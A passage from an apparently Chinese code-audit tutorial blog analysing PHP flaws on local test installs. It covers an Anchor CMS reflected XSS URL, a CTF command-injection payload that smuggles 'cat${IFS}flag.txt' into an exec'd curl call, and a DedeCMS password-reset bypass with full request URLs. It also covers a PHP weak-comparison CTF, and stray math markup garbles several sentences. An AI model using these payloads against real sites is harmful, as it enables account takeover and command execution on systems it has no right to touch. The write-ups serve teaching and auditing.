style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mopen">(</span></span></span></span>uri, $server)把uri传入format方法</p>
<p>可以知道FILTER_SANITIZE_URL这个过滤器允许所有的字母、数字以及 -_.+!*'(),{}|\^~[]`"><#%; ?:@&="，然后parse_url(uri," php_url_path)只是用来解析uri的函数，并没有过滤功能< p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image012.jpg" alt="img" style="zoom:80%;">
<p>format方法如下，这里调用的几个方法，都没有进行xxs攻击的过滤</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image014.jpg" alt="img" style="zoom:80%;">
<p>remove_relative_uri方法代码</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image016.jpg" alt="img" style="zoom: 80%;">
<p>remove_script_name方法代码</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image018.jpg" alt="img" style="zoom:80%;">
<h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用：</h3>
<p>所以我们只要输入一个xxs代码，就可以通过current_url()调用到网页中发起xss攻击</p>
<p>访问<a href="http://127.0.0.1/anchor-cms-0.9.2/index.php/alert('xssattack')">http://127.0.0.1/anchor-cms-0.9.2/index.php/%3Cscript%3Ealert('xssattack%27)%3C/script%3E</a>的结果如下</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image020.jpg" alt="img" style="zoom:80%;">
<h3 id="ctf题目"><a class="markdownIt-Anchor" href="#ctf题目"></a> CTF题目</h3>
<p>源代码：</p>
<p>Index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>) &amp;&amp; filter_var(<span class="hljs-variable">$url</span>, FILTER_VALIDATE_URL))&#123;<br>  <span class="hljs-variable">$site_info</span> = parse_url(<span class="hljs-variable">$url</span>);<br>  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/sec-redclub.com$/&#x27;</span>,<span class="hljs-variable">$site_info</span>[<span class="hljs-string">&#x27;host&#x27;</span>]))&#123;<br>    exec(<span class="hljs-string">&#x27;curl &quot;&#x27;</span>.<span class="hljs-variable">$site_info</span>[<span class="hljs-string">&#x27;host&#x27;</span>].<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="hljs-subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span><br><span class="hljs-string">       &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> implode(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$result</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);<br>  &#125; <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span><br><span class="hljs-string">     &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
<p>f1agi3hEre.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<h4 id="filter_var函数"><a class="markdownIt-Anchor" href="#filter_var函数"></a> filter_var()函数</h4>
<p>filter_var() 函数通过指定的过滤器过滤一个变量。如果成功，则返回被过滤的数据。如果失败，则返回 FALSE。<br>
<code>用法：filter_var(variable, filter, options)</code></p>
<p><code>这里第二个参数是</code>FILTER_VALIDATE_URL过滤器，这个过滤器是用来过滤url的，但是这个过滤器会把伪协议当成url处理，例如JavaScript://这样的协议就会通过</p>
<p><code>然后</code>parse_url()这个函数是用来处理url的，解析 URL，返回其组成部分，</p>
<p>接下来用preg_match()函数匹配字符串’/sec-redclub.com<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi mathvariant="normal">/</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">，</mi><mi mathvariant="normal">与</mi></mrow><annotation encoding="application/x-tex">/&#x27;，与</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">/</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">与</span></span></span></span>site_info[‘host’] 匹配，所以这个字符串只能在parse_url()解析的host的最后面</p>
<p>接下来就到了exec(‘curl &quot;’.$site_info[‘host’].’&quot;’, $result);</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><code class="hljs mel">curl可以把www.baidu.com;<span class="hljs-keyword">ls</span>;<span class="hljs-string">` sec-redclub.com这样的url解析成`</span>www.baidu.com，<span class="hljs-keyword">ls</span>，和sec-redclub.com<br></code></pre></td></tr></table></figure>
<p>所以我们构建的payload是http://192.168.44.3/red/?url=2333://”;cat${IFS}flag.txt;”<a href="http://sec-redclub.com">sec-redclub.com</a></p>
<p><code>双引号用来闭合前面的双引号，</code><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>I</mi><mi>F</mi><mi>S</mi><mi mathvariant="normal">在</mi><mi>l</mi><mi>i</mi><mi>n</mi><mi>u</mi><mi>x</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">表</mi><mi mathvariant="normal">示</mi><mi mathvariant="normal">分</mi><mi mathvariant="normal">隔</mi><mi mathvariant="normal">符</mi><mo separator="true">,</mo><mi mathvariant="normal">单</mi><mi mathvariant="normal">纯</mi><mi mathvariant="normal">的</mi><mi>c</mi><mi>a</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">IFS在linux下表示分隔符, 单纯的cat</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback">在</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">u</span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">隔</span><span class="mord cjk_fallback">符</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">单</span><span class="mord cjk_fallback">纯</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span></span></span></span>IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">效果如下<br></code></pre></td></tr></table></figure>
<p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image022.gif" alt="img" style="zoom:80%;">``</p>
<h2 id="红日安全代码审计-day-4-false-beard"><a class="markdownIt-Anchor" href="#红日安全代码审计-day-4-false-beard"></a> 红日安全[代码审计] Day 4 - False Beard</h2>
<h3 id="实例分析-2"><a class="markdownIt-Anchor" href="#实例分析-2"></a> 实例分析</h3>
<p>首先安装环境，织梦cms5.7版本</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image024.jpg" alt="img" style="zoom:80%;">
<p>这个cms存在任意用户密码重置漏洞，触发点在\uploads\member\resetpassword.php</p>
<p>前面是判断当 $dopost 等于 safequestion 的时候，通过传入的 $mid 对应的 id 值来查询对应用户的安全问题、安全答案、用户id、电子邮件等信息。</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image026.jpg" alt="img" style="zoom:80%;">
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;safequestion&#x27;</span>] == <span class="hljs-variable">$safequestion</span> &amp;&amp; <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;safeanswer&#x27;</span>] == <span class="hljs-variable">$safeanswer</span>)<br>  &#123;<br>    sn(<span class="hljs-variable">$mid</span>, <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;userid&#x27;</span>], <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;email&#x27;</span>], <span class="hljs-string">&#x27;N&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
<p>前面判断了我们传入的值是否非空，这个判断语句是把数据库中的安全问题和安全答案与用户输入的进行对比，不过这里的判断条件是==，而不是===</p>
<p>PHP中这两个运算符的区别如下</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image028.jpg" alt="img" style="zoom:67%;">
<p>所以假设用户没有设置安全问题和答案，那么默认情况下安全问题的值为 0 ，答案的值为 null （这里是数据库中的值，即 $row[‘safequestion’]=“0” 、 $row[‘safeanswer’]=null ）。当没有设置 safequestion 和 safeanswer 的值时，它们的值均为空字符串。第11行的if表达式也就变成了 if(‘0’ == ‘’ &amp;&amp; null == ‘’) ，即 if(false &amp;&amp; true) ，因为null其实就是空字符，所以我们只要让表达式 $row[‘safequestion’] == $safequestion 为 true 即可绕过。</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image030.jpg" alt="img" style="zoom: 80%;">
<p>测试0.0，0e1，0.这3个都可以和0比较通过，利用这个可以绕过此判断，进入sn函数</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image032.jpg" alt="img" style="zoom:80%;">
<p>在sn函数中if(!is_array(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>o</mi><mi>w</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi mathvariant="normal">，</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">row))，的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">的</span></span></span></span>row会根据id到pwd_tmp表中判断是否存在对应的临时密码记录判断用户是否第一次进行忘记密码操作，如果是第一次，那if(!is_array(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>o</mi><mi>w</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi mathvariant="normal">就</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">判</mi><mi mathvariant="normal">断</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">进</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">到</mi><mi>n</mi><mi>e</mi><mi>w</mi><mi>m</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">row))就会判断通过，进入到 newmail(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">到</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mopen">(</span></span></span></span>mid,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>d</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">userid,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mpunct">,</span></span></span></span>mailto,‘INSERT’,$send); 在 newmail 函数中执行 INSERT 操作</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image034.jpg" alt="img" style="zoom:80%;">
<p>在INSERT 操作主要功能是发送修改密码的邮件到用户邮箱，然后插入一条记录在dede_pwd_tmp表中，我们可以看到$send == 'N’时，执行以下操作</p>
<p>return ShowMsg(‘稍后跳转到修改页’, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>f</mi><msub><mi>g</mi><mi>b</mi></msub><mi>a</mi><mi>s</mi><mi>e</mi><mi>h</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">cfg_basehost.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">h</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord">.</span></span></span></span>cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;id=&quot;.mid."&amp;key=".randval);</p>
<p>用来打印修改密码的链接修改密码链接中的 $mid 参数对应的值是用户id，而 $randval 是在第一次 insert 操作的时候将其 md5 加密之后插入到 dede_pwd_tmp 表中</p>
<p>所以我们可以知道拼接的url是?dopost=getpasswd&amp;id=mid&key=randval</p>
<p>dopost=getpasswd 的操作在resetpassword.php中</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image036.jpg" alt="img" style="zoom:80%;">
<p>在重置密码的时候判断输入的用户id是否执行过重置密码，如果id为空则退出；如果 $row 不为空，则会执行以下操作内容</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image038.jpg" alt="img" style="zoom:80%;">
<p>这几行代码会判断修改密码是否超时，如果没有超时，就会进入密码修改页面，代码如下，会把$step赋值为2</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image040.jpg" alt="img" style="zoom:80%;">
<p>然后现在的数据包中 $setp=2，然后又到了resetpassword.php 文件中。</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image042.jpg" alt="img" style="zoom:80%;">
<p>if($row[‘pwd’] == <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>n</mi><mo stretchy="false">)</mo><mi mathvariant="normal">判</mi><mi mathvariant="normal">断</mi><mi mathvariant="normal">传</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">据</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">否</mi><mi mathvariant="normal">等</mi><mi mathvariant="normal">于</mi></mrow><annotation encoding="application/x-tex">sn)判断传入的数据是否等于</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">否</span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">于</span></span></span></span>row[‘pwd’] 如果相等就完成重置密码操作</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image044.gif" alt="img" style="zoom:80%;">
<h3 id="攻击过程"><a class="markdownIt-Anchor" href="#攻击过程"></a> 攻击过程</h3>
<p>首先注册2个用户</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image046.jpg" alt="img" style="zoom:80%;">
<p>提交一个请求，这里232343用户的ID是3，所以提交</p>
<p><a href="http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=3">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=3</a></p>
<p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image048.gif" alt="img"></p>
<p>然后抓包发送得到key值</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image050.jpg" alt="img" style="zoom:80%;">
<p>这里key=KEZatlFV，构建<a href="http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=3&amp;key=KEZatlFVrh">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=3&amp;key=KEZatlFVrh</a></p>
<p>然后访问，把密码修改为123456</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image052.jpg" alt="img" style="zoom:80%;">
<p>提示修改成功并且登录</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image054.jpg" alt="img" style="zoom:80%;">
<p>数据库里的值也变成123456的md5值了</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image056.jpg" alt="img" style="zoom:80%;">
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image058.jpg" alt="img" style="zoom:80%;">
<h3 id="ctf题目-2"><a class="markdownIt-Anchor" href="#ctf题目-2"></a> CTF题目</h3>
<p>首先题目是一个摇奖程序</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image060.gif" alt="img" style="zoom:80%;">
<p>输入用户名就可以进行摇奖，但是金额只有20</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image062.gif" alt="img" style="zoom:80%;">
<p>查看这个比较的代码(buy.php)里面有一段代码调用了buy.js</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image064.gif" alt="img" style="zoom:80%;">
<p>在buy.js中程序将表单数据以json格式提交到api.php中</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image066.gif" alt="img" style="zoom:80%;">
<p>而api.php中，把传入的数据用==进行比较，这涉及到PHP弱比较的问题</p>
<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image068.gif" alt="img" style="zoom:80%;">
<p>如果我们用true进行比较的话，就会把数字也转换成bool类型进行比较，就会比较通过了，而除了 0、false、null 以外均为 true，所以只要后台生成的数字没有0，就可以比较通过了。</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image070.gif" alt="img" style="zoom:80%;">
<p>如图，显示比较成功了，金额增加了200000，多次发包，让自己的钱可以买flag就可以了</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image072.gif" alt="img" style="zoom:80%;">
<h2 id="红日安全代码审计day-7-bell"><a class="markdownIt-Anchor" href="#红日安全代码审计day-7-bell"></a> 红日安全[代码审计]Day 7 – Bell</h2>
<p>首先安装带有漏洞的DedeCmsV5.6 版本</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image074.gif" alt="img" style="zoom:80%;">
<p>根据官网发布的v5.7版本的补丁可以知道漏洞是由于 mchStrCode 这个编码方法造成的。</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image076.gif" alt="img" style="zoom:80%;">
<p>我们先在文件夹里搜索mchStrCode发现有3处</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image078.gif" alt="img" style="zoom:80%;">
<p>查看第一处的代码，如下图，这段代码是用parse_str 方法将mchStrCode函数解码后 $pd_encode 中的变量放到 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>c</mi><msub><mi>h</mi><mi>P</mi></msub><mi>o</mi><mi>s</mi><mi>t</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">然</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">mch_Post 数组中然后通过foreach(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">c</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mopen">(</span></span></span></span>mch_Post as $k =&gt; $v) $$k = <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mo separator="true">;</mo><mi mathvariant="normal">，</mi><mi mathvariant="normal">把</mi></mrow><annotation encoding="application/x-tex">v;，把</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">把</span></span></span></span>mch_Post 中的键和值都赋给$k， $v</p>
<p>在这个过程没有对定义的键值进行检查，如果攻击者通过mschstrcode进行编码，绕过一些过滤方式，就可以使代码直达目标</p>
